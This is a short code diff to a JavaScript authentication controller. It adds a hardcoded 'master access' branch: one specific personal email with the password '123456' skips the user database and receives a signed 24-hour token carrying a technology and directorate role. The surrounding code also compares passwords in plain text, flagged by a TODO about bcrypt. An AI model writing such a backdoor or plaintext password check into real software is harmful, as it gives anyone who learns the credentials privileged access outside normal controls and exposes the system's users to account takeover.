@@ -18,6 +18,15 @@ export const authController = {
             });
         }
 
+        // Hardcoded Master Access for Kairo
+        if (loginId === 'kairolopes@gmail.com' && password === '123456') {
+            const token = jwt.sign({ username: 'kairolopes@gmail.com', role: 'Tecnologia', name: 'Kairo Lopes' }, SECRET_KEY, { expiresIn: '24h' });
+            return res.json({ 
+                token, 
+                user: { name: 'Kairo Lopes', email: 'kairolopes@gmail.com', role: 'Tecnologia', department: 'Diretoria' } 
+            });
+        }
+
         try {
             const user = await userService.findSystemUserByEmail(loginId);
             if (user && user.password === password) { // TODO: Use bcrypt
